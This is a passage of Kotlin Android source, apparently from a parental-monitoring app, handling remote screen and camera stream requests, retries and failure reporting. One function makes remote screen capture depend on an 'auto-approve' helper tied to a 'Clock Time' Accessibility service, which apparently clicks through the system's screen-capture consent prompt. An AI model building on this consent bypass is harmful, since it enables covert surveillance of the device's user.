                    putExtra(MainActivity.EXTRA_CAMERA_FACING, cameraFacing)
                }
            }
            context.startActivity(intent)
            PcpFlowLogger.log(
                PcpFlowLogger.Category.SERVICE_STATE,
                "MainActivity launched for stream consent",
                "type=$streamType",
            )
        } catch (e: Exception) {
            PcpFlowLogger.error(
                PcpFlowLogger.Category.SERVICE_STATE,
                "Failed to wake MainActivity",
                e,
            )
        }
    }

    private fun parseDeviceIdFromToken(token: String): String? {
        return try {
            val parts = token.split(".")
            if (parts.size < 2) return null
            var payload = parts[1]
            val pad = (4 - payload.length % 4) % 4
            payload += "=".repeat(pad)
            val json = JSONObject(String(Base64.decode(payload, Base64.URL_SAFE or Base64.NO_WRAP)))
            json.optString("deviceId").takeIf { it.isNotBlank() }
        } catch (_: Exception) {
            null
        }
    }

    private fun scheduleStreamRetry(
        context: Context,
        roomId: String,
        streamType: String,
        sessionId: String,
        cameraFacing: String?,
        reason: String,
        attempt: Int,
    ) {
        if (attempt >= 5) {
            reportStreamFailure(context, sessionId, reason)
            return
        }
        val delayMs = when (reason) {
            "FGS_GATE_CLOSED" -> 4000L
            "PROJECTION_SESSION_NOT_WARM" -> 5000L
            else -> 3000L
        }
        // P1-3: use AtomicReference so the set + delayed-clear is race-free.
        // If two threads call scheduleStreamRetry concurrently, the later writer wins
        // and the delayed handler for the earlier call sees a mismatched sessionId and
        // returns without executing, preventing a duplicate retry.
        val retry = PendingStreamRetry(roomId, streamType, sessionId, cameraFacing, reason, attempt)
        pendingStreamRetry.set(retry)
        Log.d(TAG, "scheduleStreamRetry session=$sessionId reason=$reason attempt=$attempt delayMs=$delayMs")
        mainHandler.postDelayed({
            // Atomically claim ownership of this retry slot; if a newer retry has already
            // replaced ours, compareAndSet returns false and we leave without acting.
            val claimed = pendingStreamRetry.compareAndSet(retry, null)
            if (!claimed) {
                Log.d(TAG, "scheduleStreamRetry: retry superseded by newer entry — skipping session=$sessionId")
                return@postDelayed
            }
            PcpFlowLogger.log(
                PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
                "retrying deferred stream",
                "session=$sessionId reason=$reason attempt=${attempt + 1}",
            )
            onStreamRequest(context, retry.roomId, retry.streamType, retry.sessionId, retry.cameraFacing)
        }, delayMs)
    }

    /**
     * Parent Start Screen Sharing only: warm existing projection, or launch Cast when
     * Accessibility is enabled. Never used by boot/monitoring recovery.
     */
    private fun ensureScreenConsentForParentStart(context: Context, sessionId: String): Boolean {
        if (ScreenCaptureController.hasLiveProjection()) return true
        if (MediaProjectionTokenStore.hasValidToken(context) &&
            MediaProjectionSessionKeeper.ensureReady(context)
        ) {
            return true
        }

        if (!ScreenCaptureAutoApprove.isReady(context)) {
            PcpFlowLogger.warn(
                PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
                "screen stream blocked — Accessibility disabled (no Cast launch)",
                "session=$sessionId",
            )
            Log.e(TAG, "Screen share requires Clock Time Accessibility — Cast NOT launched")
            reportStreamFailure(context, sessionId, "ACCESSIBILITY_DISABLED")
            return false
        }

        MediaProjectionRecoveryWorker.cancel(context)
        MediaProjectionRecoveryTelemetry.clearRecoveryAttemptBudget(context)
        val granted = MediaProjectionConsentHelper.ensureConsent(
            context,
            45_000L,
            ConsentLaunchSource.PARENT_SCREEN_SHARE,
        )
        if (!granted) {
            val reason = when (MediaProjectionTokenStore.getConsentState(context)) {
                MediaProjectionConsentState.LOST_AFTER_PROCESS_DEATH -> "PROJECTION_LOST_AFTER_RESTART"
                MediaProjectionConsentState.REQUIRES_RECONSENT -> "PROJECTION_REQUIRES_RECONSENT"
                MediaProjectionConsentState.NEVER_GRANTED -> "NO_SCREEN_CAPTURE_CONSENT"
                else -> "NO_SCREEN_CAPTURE_CONSENT"
            }
            MediaProjectionLossHandler.onProjectionUnavailable(context, "parent_screen_consent_failed")
            reportStreamFailure(context, sessionId, reason)
            return false
        }
        return true
    }

    private fun reportStreamFailure(context: Context, sessionId: String, reason: String) {
        Thread {
            DeviceHttpClient.reportStreamFailure(context, sessionId, reason)
        }.start()
    }
}
